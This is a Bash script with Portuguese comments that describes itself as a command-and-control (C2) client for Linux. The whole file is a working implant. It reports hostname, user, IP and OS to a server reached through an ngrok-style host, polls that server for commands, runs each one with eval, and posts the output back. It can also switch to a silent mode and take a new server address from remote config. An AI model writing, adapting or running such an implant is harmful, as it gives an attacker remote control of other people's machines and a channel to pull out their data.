#!/bin/bash
# Script cliente C2 para Linux
# Este script conecta-se ao servidor C2 e executa comandos

NGROK_HOST="127.0.0.1"
NGROK_PORT=5000
RETRY_INTERVAL=2
SILENT_MODE=false

# Obter informações do host
get_host_info() {
    HOSTNAME=$(hostname)
    USERNAME=$(whoami)
    IP=$(hostname -I | awk '{print $1}')
    OS=$(uname -a)
    TIMESTAMP=$(date +%s)
    
    echo "{\"hostname\":\"$HOSTNAME\",\"username\":\"$USERNAME\",\"ip\":\"$IP\",\"os\":\"$OS\",\"time\":$TIMESTAMP}"
}

# Enviar relatório de status
send_status_report() {
    HOST_INFO=$(get_host_info)
    
    curl -s -X POST -H "Content-Type: application/json" -d "$HOST_INFO" "http://${NGROK_HOST}:${NGROK_PORT}/report/status"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar relatório de status"
    fi
}

# Enviar heartbeat
send_heartbeat() {
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/heartbeat"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar heartbeat"
    fi
}

# Enviar log
send_log() {
    LOG_MESSAGE=$1
    LOG_TYPE=${2:-"info"}
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"log\":\"$LOG_MESSAGE\",\"time\":$TIMESTAMP,\"type\":\"$LOG_TYPE\"}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/logs"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar log: $LOG_MESSAGE"
    fi
}

# Enviar erro
send_error() {
    ERROR_MESSAGE=$1
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"error\":\"$ERROR_MESSAGE\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/error"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar erro: $ERROR_MESSAGE"
    fi
}

# Enviar saída de comando
send_command_output() {
    COMMAND=$1
    OUTPUT=$2
    HOSTNAME=$(hostname)
    TIMESTAMP=$(date +%s)
    
    # Escapar aspas e caracteres especiais no output
    OUTPUT_ESCAPED=$(echo "$OUTPUT" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed 's/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
    
    JSON="{\"hostname\":\"$HOSTNAME\",\"command\":\"$COMMAND\",\"output\":\"$OUTPUT_ESCAPED\",\"time\":$TIMESTAMP}"
    
    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/output"
    
    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
        echo "Falha ao enviar saída de comando"
    fi
}

# Obter comando do servidor
get_command() {
    HOSTNAME=$(hostname)
    
    COMMAND=$(curl -s "http://${NGROK_HOST}:${NGROK_PORT}/command?hostname=$HOSTNAME")
    
    echo "$COMMAND"
}

# Executar comando
execute_command() {
    COMMAND=$1
    
    if [ -z "$COMMAND" ]; then
        return
    fi
    
    send_log "Executando comando: $COMMAND"
    
    # Criar diretório temporário para armazenar a saída
    TEMP_DIR=$(mktemp -d)
    TEMP_FILE="$TEMP_DIR/output.txt"
    
    # Executar comando em um subshell com diretório temporário para manter contexto de diretório
    # A opção -l executa login shell para garantir o mesmo ambiente de login
    # Redirecionar saída padrão e erro para arquivo temporário
    (cd "$PWD" && eval "$COMMAND" > "$TEMP_FILE" 2>&1)
    
    # Ler a saída do arquivo
    OUTPUT=$(cat "$TEMP_FILE")
    
    # Limpar arquivos temporários
    rm -rf "$TEMP_DIR"
    
    # Se não houver saída, usar uma mensagem padrão
    if [ -z "$OUTPUT" ]; then
        OUTPUT="Comando executado com sucesso, sem saída."
    fi
    
    # Enviar saída de comando imediatamente
    send_command_output "$COMMAND" "$OUTPUT"
}

# Atualizar configuração
update_config() {
    CONFIG=$(curl -s "http://${NGROK_HOST}:${NGROK_PORT}/config")
    
    if [ $? -eq 0 ]; then
        NGROK_HOST=$(echo "$CONFIG" | grep -o '"ngrok_host":"[^"]*"' | cut -d'"' -f4)
        NGROK_PORT=$(echo "$CONFIG" | grep -o '"ngrok_port":[0-9]*' | cut -d':' -f2)
        RETRY_INTERVAL=$(echo "$CONFIG" | grep -o '"retry_interval":[0-9]*' | cut -d':' -f2)
        SILENT_MODE=$(echo "$CONFIG" | grep -o '"silent_mode":(true|false)' | cut -d':' -f2)
    elif [ "$SILENT_MODE" = false ]; then
        echo "Falha ao atualizar configuração"
    fi
}

# Variável para controlar a execução de comandos
EXECUTING_COMMAND=false

# Loop principal
main() {
    # Enviar relatório de status inicial
    send_status_report
    
    # Loop principal
    while true; do
        # Enviar heartbeat em paralelo para não bloquear
        send_heartbeat &
        
        # Obter comando do servidor se não estiver executando outro comando
        if [ "$EXECUTING_COMMAND" = false ]; then
            COMMAND=$(get_command)
            if [ ! -z "$COMMAND" ]; then
                # Marcar que está executando um comando
                EXECUTING_COMMAND=true
                
                # Executar comando em background para não bloquear o loop principal
                (
                    execute_command "$COMMAND"
                    # Após terminar a execução, liberar para o próximo comando
                    EXECUTING_COMMAND=false
                ) &
            fi
        fi
        
        # Atualizar configuração (em background)
        update_config &
        
        # Informar que o script está atualizado
        send_log "Script remoto atualizado." "script_update"
        
        # Aguardar intervalo de tempo mais curto para comandos
        sleep $RETRY_INTERVAL
    done
}

# Iniciar o script
main